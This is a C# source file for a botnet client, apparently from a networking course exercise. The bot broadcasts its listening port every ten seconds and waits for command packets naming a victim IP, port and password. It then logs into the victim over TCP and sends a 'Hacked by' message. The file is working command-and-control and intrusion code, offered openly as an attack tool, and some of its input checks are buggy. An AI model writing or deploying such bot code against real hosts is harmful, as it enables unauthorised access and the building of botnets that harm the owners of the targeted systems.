using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace C_and_C
{
    class bot
    {
        private int UDPPort;
        private int TCPPort;

        private static void StartListener(int UDPPort)
        {
            UdpClient listener = null;
            try
            {
                listener = new UdpClient(UDPPort);
            }
            catch (Exception e) { }
            if(listener != null)
            {
                IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, UDPPort);

                //UdpClient listener1 = new UdpClient(31337);
                IPEndPoint groupEP1 = new IPEndPoint(IPAddress.Any, 31337);
                Console.WriteLine("Bot is listening on port " + UDPPort + ".");
                try
                {
                    Thread thread = new Thread(() => CallToChildThread(UDPPort));
                    thread.Start();

                }
                catch (Exception e)
                {
                    Console.WriteLine("Error..... " + e.StackTrace);
                }
                try
                {
                    while (true)
                    {
                        byte[] bytes = listener.Receive(ref groupEP1);
                        if (bytes.Length == 44)
                        {
                            String mess = Encoding.ASCII.GetString(bytes, 0, bytes.Length);
                            String ip = "";
                            for (int i = 0; i < 4; i++)
                            {
                                ip = ip + bytes[i];
                                if (i < 3)
                                    ip = ip + ".";
                            }
                            byte[] vicPortByte = { bytes[4], bytes[5], 0, 0 };
                            byte[] vicPasswordByte = new byte[6];
                            byte[] serverNameByte = new byte[32];
                            for (int i = 6; i < 12; i++)
                            {
                                vicPasswordByte[i - 6] = bytes[i];
                            }
                            for (int i = 12; i < bytes.Length; i++)
                            {
                                serverNameByte[i - 12] = bytes[i];
                            }

                            String vicPort = BitConverter.ToInt32(vicPortByte, 0).ToString();
                            String vicPassword = Encoding.ASCII.GetString(vicPasswordByte, 0, vicPasswordByte.Length);
                            String serverName = Encoding.ASCII.GetString(serverNameByte, 0, serverNameByte.Length);
                            if(is_legal_ip(ip) && is_legal_port(vicPort) && is_legal_password(vicPassword))
                                botActivate(ip, vicPort, vicPassword, serverName);

                        }
                    }
                }
                catch (SocketException e)
                {
                    
                }

                finally
                {
                    listener.Close();
                }
            }
            
        }

        private static bool is_legal_ip(string ip)
        {
            bool ans = false;
            try
            {
                string[] str = ip.Split('.');
                if (str.Length == 4)
                {
                    foreach (string s in str)
                    {
                        int tmp = int.Parse(s);
                        if (tmp < 0 && tmp > 255)
                        {
                            ans = false;
                            break;
                        }
                    }
                    ans = true;
                }
            }
            catch (Exception e)
            {

            }

            return ans;
        }

        private static bool is_legal_port(string port)
        {
            bool ans = false;
            try
            {
                int p = int.Parse(port);
                if (p > 1023 && p < 65536)
                    ans = true;
            }
            catch (Exception e)
            {

            }

            return ans;
        }

        private static bool is_legal_password(string password)
        {
            bool ans = true;
            try
            {
                if (password.Length == 6)
                {
                    foreach (char p in password)
                    {
                        int c = p;
                        if (c < 97 || c > 122)
                        {
                            ans = false;
                            break;
                        }
                    }
                }
            }
            catch (Exception e)
            {

            }

            return ans;
        }

        public static void Main()
        {
            Random r = new Random();
            //int UDPPort = r.Next(1024, 65535);
            Thread thread = new Thread(() => StartListener(r.Next(1024, 65535)));
            thread.Start();
        }


        public static void CallToChildThread(int UDPPort)
        {
            while (true)
            {
                // the thread is paused for 10000 milliseconds
                int sleepfor = 10000;
                botAnnouncement(UDPPort);
                Thread.Sleep(sleepfor);
            } 
        }

        public static void botAnnouncement(int UDPPort)
        {
            UdpClient client = new UdpClient();
            IPEndPoint ip = new IPEndPoint(IPAddress.Parse("255.255.255.255"), 31337);
            byte[] bytes1 = BitConverter.GetBytes(UDPPort);
            byte[] bytes2 = { bytes1[0], bytes1[1] };
            client.Send(bytes2, bytes2.Length, ip);
            client.Close();
        }

        public static void botActivate(string ip, string port, string password, string server_name)
        {
            TcpClient tcpClient = new TcpClient();
            try
            {
                IPAddress IP_Address = IPAddress.Parse(ip);
                tcpClient.Connect(IP_Address, Int32.Parse(port));
                Stream s = tcpClient.GetStream();

                string responseData = read_msg(s, 28).Replace("\r\n", "");
                if (responseData.Equals("Please enter your password"))
                {
                    sent_msg(s, password);
                    responseData = read_msg(s, 16).Replace("\r\n", "");

                    if (responseData.Equals("Access granted"))
                    {
                        sent_msg(s, "Hacked by " + server_name + "\r\n");
                    }
                }

            }

            catch (Exception e)
            {
                Console.WriteLine("Error in connection to victem");
            }
            finally
            {
                tcpClient.Close();
            }
        }
        private static void sent_msg(Stream stream, string to_send)
        {
            ASCIIEncoding asen = new ASCIIEncoding();
            byte[] ba = asen.GetBytes(to_send);
            stream.Write(ba, 0, ba.Length);
        }

        private static string read_msg(Stream s, int size)
        {
            Byte[] data = new Byte[size];
            Int32 bytes = s.Read(data, 0, data.Length);
            return System.Text.Encoding.ASCII.GetString(data, 0, bytes);
        }
    }

}